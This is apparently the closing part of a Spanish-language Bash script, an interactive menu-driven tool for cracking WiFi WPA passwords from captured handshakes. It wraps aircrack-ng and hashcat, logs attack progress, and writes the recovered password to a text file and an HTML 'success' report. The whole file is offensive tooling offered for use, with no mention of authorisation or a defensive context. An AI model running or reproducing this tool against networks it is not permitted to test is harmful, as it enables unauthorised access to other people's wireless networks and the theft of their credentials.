            echo "Target ESSID: $TARGET_ESSID"
            echo "Handshake File: $HANDSHAKE_FILE"
            echo "Wordlist Used: $WORDLIST_FILE"
            echo "Method: $ATTACK_METHOD"
            echo "PASSWORD: $password"
            echo "Log File: $log_file"
        } > "$success_file"
        
        echo -e "${CYAN}💾 Resultado guardado en: $success_file${NC}"
        
        # Crear reporte HTML
        create_success_report "$password"
        
        return 0
    else
        echo -e "${YELLOW}❌ No se encontró la contraseña${NC}"
        
        # Analizar progreso del ataque
        analyze_attack_progress "$log_file"
        
        echo -e "\n${CYAN}💡 Sugerencias:${NC}"
        echo -e "  • Usar wordlist más grande"
        echo -e "  • Probar generación personalizada"
        echo -e "  • Intentar con reglas de mutación"
        echo -e "  • Verificar que el handshake sea válido"
        
        return 1
    fi
}

analyze_attack_progress() {
    local log_file="$1"
    
    if [[ ! -f "$log_file" ]]; then
        return
    fi
    
    echo -e "\n${CYAN}📈 Análisis del ataque:${NC}"
    
    # Progreso aircrack-ng
    local tested=$(grep -c "Tested" "$log_file" 2>/dev/null || echo "0")
    local keys_tested=$(grep "keys tested" "$log_file" 2>/dev/null | tail -1 | grep -o "[0-9]*" | head -1 || echo "0")
    
    # Progreso hashcat
    local hashcat_progress=$(grep "Progress" "$log_file" 2>/dev/null | tail -1)
    
    if [[ $tested -gt 0 ]]; then
        echo -e "  📊 Claves probadas: ${CYAN}$keys_tested${NC}"
    fi
    
    if [[ -n "$hashcat_progress" ]]; then
        echo -e "  📊 Progreso hashcat: ${CYAN}$hashcat_progress${NC}"
    fi
    
    # Tiempo transcurrido
    local start_time=$(head -1 "$log_file" | grep -o "[0-9][0-9]:[0-9][0-9]:[0-9][0-9]" | head -1)
    local end_time=$(tail -1 "$log_file" | grep -o "[0-9][0-9]:[0-9][0-9]:[0-9][0-9]" | tail -1)
    
    if [[ -n "$start_time" && -n "$end_time" ]]; then
        echo -e "  ⏱️ Tiempo: ${CYAN}$start_time - $end_time${NC}"
    fi
}

create_success_report() {
    local password="$1"
    local report_file="$OUTPUT_DIR/reports/success_report.html"
    mkdir -p "$(dirname "$report_file")"
    
    cat > "$report_file" << EOF
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>WiFi Password Cracking - Éxito</title>
    <style>
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); margin: 0; padding: 20px; }
        .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
        .header { text-align: center; margin-bottom: 30px; }
        .success { background: #d4edda; border: 1px solid #c3e6cb; color: #155724; padding: 15px; border-radius: 5px; margin: 20px 0; }
        .password { background: #f8f9fa; border: 2px solid #28a745; padding: 20px; border-radius: 10px; font-family: monospace; font-size: 18px; text-align: center; margin: 20px 0; }
        .details { background: #f8f9fa; padding: 15px; border-radius: 5px; margin: 10px 0; }
        .label { font-weight: bold; color: #495057; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎉 Contraseña WiFi Encontrada</h1>
        </div>
        
        <div class="success">
            <h2>✅ ¡Éxito en el Cracking!</h2>
            <p>La contraseña ha sido encontrada exitosamente.</p>
        </div>
        
        <div class="password">
            <strong>🔑 Contraseña: ${password}</strong>
        </div>
        
        <div class="details">
            <span class="label">🎯 ESSID:</span> ${TARGET_ESSID}<br>
            <span class="label">📁 Handshake:</span> $(basename "$HANDSHAKE_FILE")<br>
            <span class="label">📚 Wordlist:</span> $(basename "$WORDLIST_FILE")<br>
            <span class="label">🔧 Método:</span> ${ATTACK_METHOD}<br>
            <span class="label">📅 Fecha:</span> $(date)<br>
        </div>
        
        <div class="details">
            <h3>📊 Estadísticas</h3>
            <p>Ataque completado exitosamente usando ${ATTACK_METHOD}</p>
        </div>
    </div>
</body>
</html>
EOF
    
    echo -e "${CYAN}📊 Reporte HTML creado: $report_file${NC}"
}

setup_output_directory() {
    OUTPUT_DIR="wifi_cracking_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$OUTPUT_DIR"/{logs,results,reports,wordlists,converted}
    
    echo -e "${GREEN}📁 Directorio creado: $OUTPUT_DIR${NC}"
    
    # Crear archivo de información
    cat > "$OUTPUT_DIR/attack_info.txt" << EOF
# WiFi Password Cracking Session - $(date)
Handshake File: $HANDSHAKE_FILE
Target ESSID: $TARGET_ESSID
Wordlist: $WORDLIST_FILE
Attack Method: $ATTACK_METHOD
Started: $(date)
EOF
}

show_results_summary() {
    echo -e "\n${BLUE}╔════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}                   ${YELLOW}RESUMEN DE CRACKING WIFI${NC}                        ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════════════════════════════════════════╝${NC}"
    
    echo -e "${CYAN}📁 Directorio del proyecto: $OUTPUT_DIR${NC}"
    
    if [[ -n "$TARGET_ESSID" ]]; then
        echo -e "\n${GREEN}🎯 Objetivo:${NC}"
        echo -e "  📝 ESSID: $TARGET_ESSID"
        echo -e "  📁 Handshake: $(basename "$HANDSHAKE_FILE")"
        echo -e "  📚 Wordlist: $(basename "$WORDLIST_FILE")"
        echo -e "  🔧 Método: $ATTACK_METHOD"
    fi
    
    # Verificar si se encontró contraseña
    local success_file="$OUTPUT_DIR/results/PASSWORD_FOUND.txt"
    if [[ -f "$success_file" ]]; then
        echo -e "\n${GREEN}🎉 ¡CONTRASEÑA ENCONTRADA!${NC}"
        local password=$(grep "PASSWORD:" "$success_file" | cut -d':' -f2- | sed 's/^ *//')
        echo -e "  🔑 Password: ${YELLOW}$password${NC}"
        echo -e "  📄 Detalles: ${CYAN}$success_file${NC}"
    else
        echo -e "\n${YELLOW}❌ No se encontró contraseña${NC}"
    fi
    
    echo -e "\n${CYAN}📊 Archivos generados:${NC}"
    find "$OUTPUT_DIR" -type f 2>/dev/null | while read file; do
        local size=$(du -h "$file" 2>/dev/null | cut -f1)
        local rel_path=${file#$OUTPUT_DIR/}
        echo -e "  📄 $rel_path ($size)"
    done
    
    # Mostrar estadísticas de wordlists
    if [[ -f "$WORDLIST_FILE" ]]; then
        local word_count=$(wc -l < "$WORDLIST_FILE" 2>/dev/null || echo "?")
        echo -e "\n${CYAN}📊 Estadísticas de wordlist:${NC}"
        echo -e "  📚 Total palabras: ${CYAN}$word_count${NC}"
    fi
}

main_menu() {
    while true; do
        print_banner
        
        echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${BLUE}║${NC}                         ${YELLOW}MENÚ PRINCIPAL${NC}                               ${BLUE}║${NC}"
        echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════════════╣${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}1.${NC}  📁 Seleccionar Archivo de Handshake                             ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}2.${NC}  📚 Configurar Estrategia de Wordlist                            ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}3.${NC}  🔐 Iniciar Cracking de Contraseña                              ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}4.${NC}  ⚡ Cracking Rápido (Auto)                                       ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}5.${NC}  🎯 Cracking Personalizado Avanzado                             ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}6.${NC}  📊 Ver Resultados y Estadísticas                               ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}7.${NC}  🔧 Herramientas de Conversión                                  ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}0.${NC}  🚪 Salir                                                        ${BLUE}║${NC}"
        echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
        
        if [[ -n "$HANDSHAKE_FILE" ]]; then
            echo -e "\n${GREEN}📁 Handshake: $(basename "$HANDSHAKE_FILE")${NC}"
        fi
        
        if [[ -n "$WORDLIST_FILE" ]]; then
            echo -e "${GREEN}📚 Wordlist: $(basename "$WORDLIST_FILE")${NC}"
        fi
        
        if [[ -n "$TARGET_ESSID" ]]; then
            echo -e "${GREEN}🎯 ESSID: $TARGET_ESSID${NC}"
        fi
        
        echo ""
        read -p "Selecciona una opción (0-7): " choice
        
        case $choice in
            1) 
                select_handshake_file
                read -p "Presiona Enter para continuar..."
                ;;
            2) 
                select_wordlist_strategy
                read -p "Presiona Enter para continuar..."
                ;;
            3)
                if [[ -z "$HANDSHAKE_FILE" || -z "$WORDLIST_FILE" ]]; then
                    echo -e "${RED}❌ Configura handshake y wordlist primero${NC}"
                else
                    setup_output_directory
                    select_cracking_method
                fi
                read -p "Presiona Enter para continuar..."
                ;;
            4)
                echo -e "${YELLOW}🚀 Cracking rápido automático...${NC}"
                [[ -z "$HANDSHAKE_FILE" ]] && select_handshake_file
                [[ -z "$WORDLIST_FILE" ]] && select_predefined_wordlists
                
                if [[ -n "$HANDSHAKE_FILE" && -n "$WORDLIST_FILE" ]]; then
                    setup_output_directory
                    ATTACK_METHOD="aircrack"
                    execute_aircrack_attack
                fi
                read -p "Presiona Enter para continuar..."
                ;;
            5)
                echo -e "${YELLOW}🎯 Configurando ataque personalizado...${NC}"
                [[ -z "$HANDSHAKE_FILE" ]] && select_handshake_file
                [[ -z "$WORDLIST_FILE" ]] && select_wordlist_strategy
                
                if [[ -n "$HANDSHAKE_FILE" && -n "$WORDLIST_FILE" ]]; then
                    setup_output_directory
                    configure_custom_attack
                fi
                read -p "Presiona Enter para continuar..."
                ;;
            6)
                if [[ -n "$OUTPUT_DIR" ]]; then
                    show_results_summary
                else
                    echo -e "${YELLOW}⚠️ No hay resultados para mostrar${NC}"
                fi
                read -p "Presiona Enter para continuar..."
                ;;
            7)
                echo -e "${YELLOW}🔧 Herramientas de conversión disponibles${NC}"
                convert_handshake_format
                read -p "Presiona Enter para continuar..."
                ;;
            0)
                echo -e "${GREEN}👋 ¡Hasta luego!${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}❌ Opción inválida${NC}"
                sleep 1
                ;;
        esac
    done
}

configure_custom_attack() {
    echo -e "\n${YELLOW}🎯 Configuración de ataque personalizado...${NC}"
    select_cracking_method
}

# Verificar herramientas necesarias
missing_tools=()
recommended_tools=()

# Herramientas esenciales
for tool in aircrack-ng; do
    if ! command -v "$tool" &> /dev/null; then
        missing_tools+=("$tool")
    fi
done

# Herramientas recomendadas
for tool in hashcat john crunch; do
    if ! command -v "$tool" &> /dev/null; then
        recommended_tools+=("$tool")
    fi
done

if [[ ${#missing_tools[@]} -gt 0 ]]; then
    echo -e "${RED}❌ Herramientas esenciales faltantes: ${missing_tools[*]}${NC}"
    echo -e "${YELLOW}💡 Instala con: sudo apt install ${missing_tools[*]}${NC}"
    exit 1
fi

if [[ ${#recommended_tools[@]} -gt 0 ]]; then
    echo -e "${YELLOW}⚠️ Herramientas recomendadas faltantes: ${recommended_tools[*]}${NC}"
    echo -e "${CYAN}💡 Instala con: sudo apt install ${recommended_tools[*]}${NC}"
    echo ""
fi

# Ejecutar menú principal
main_menu